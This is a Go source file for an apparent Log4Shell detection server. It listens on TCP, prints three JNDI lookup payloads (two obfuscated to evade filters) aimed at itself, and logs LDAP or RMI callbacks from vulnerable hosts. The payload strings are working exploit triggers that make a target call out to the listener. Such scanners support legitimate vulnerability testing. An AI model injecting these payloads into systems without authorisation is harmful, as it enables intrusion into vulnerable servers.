package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
	"strconv"
)

const (
	Clearln   = "\r\x1b[2K"
)

var (
	ConnPort = flag.Int("port", 4568, "Sets the port to listen on.")
	ConnHost = flag.String("host", "localhost", "Sets the host to listen on.")
)

func main() {
		fmt.Println(Clearln + "Press ctrl+c to shutdown")
		go 	Log4jCheckServer(*ConnHost,strconv.Itoa(*ConnPort))
		c := make(chan os.Signal,1)
		signal.Notify(c,os.Interrupt,syscall.SIGTERM)
		<- c
		fmt.Println(Clearln + "ctrl+c detected. Shutting down")
}

func Log4j2HandleRequest(conn net.Conn){
	defer conn.Close()
	buf := make([]byte,1024)
	num, err := conn.Read(buf)
	if err != nil {
		fmt.Println(Clearln + "accept data reading err",err)
		_ =  conn.Close()
		return
	}
	hexStr := fmt.Sprintf("%x",buf[:num])
	// LDAP 协议
	if "300c020101600702010304008000" == hexStr {
		fmt.Println(fmt.Sprintf("[LDAP] %s Finger:%s",conn.RemoteAddr().String(),hexStr))
		return
	}
	if RMI(buf) {
		fmt.Println(fmt.Sprintf("[RMI] %s Finger:%x",conn.RemoteAddr().String(),buf[0:7]))
		return
	}
}

//TODO: https://github.com/KpLi0rn/Log4j2Scan/blob/main/core/server.go

func RMI(data []byte) bool {
	if data[0] == 0x4a && data[1] == 0x52 && data[2] == 0x4d && data[3] == 0x49 {
		if data[4] != 0x00 {
			return false
		}
		if data[5] != 0x01 && data[5] != 0x02 {
			return false
		}
		if data[6] != 0x4b && data[6] != 0x4c && data[6] != 0x4d {
			return false
		}
		lastData := data[7:]
		for _, v := range lastData {
			if v != 0x00 {
				return false
			}
		}
		return true
	}
	return false
}

func Log4jCheckServer(host string,port string){
	listen, err := net.Listen("tcp",fmt.Sprintf("%s:%s",host,port))
	if err != nil {
		fmt.Println(Clearln + "log4j listen server failed")
		return
	}
	defer listen.Close()
	//fmt.Println(fmt.Sprintf("[Log4j2] Listen start on %s:%s",host,port))
	fmt.Println(Clearln + "[payload]: ")
	fmt.Println(fmt.Sprintf(Clearln + "==> ${${lower:${lower:jndi}}:${lower:ldap}://%v:%v/poc}",host,port))
	fmt.Println(fmt.Sprintf(Clearln + "==> ${${::-j}ndi:rmi://%v:%v/poc}",host,port))
	fmt.Println(fmt.Sprintf(Clearln + "==> ${jndi:ldap://%v:%v/poc}",host,port))
	fmt.Println("-----------------------------------")
	for {
		conn, err := listen.Accept()
		if err != nil {
			fmt.Println(Clearln + "accept failed",err)
			continue
		}
		go Log4j2HandleRequest(conn)
	}
}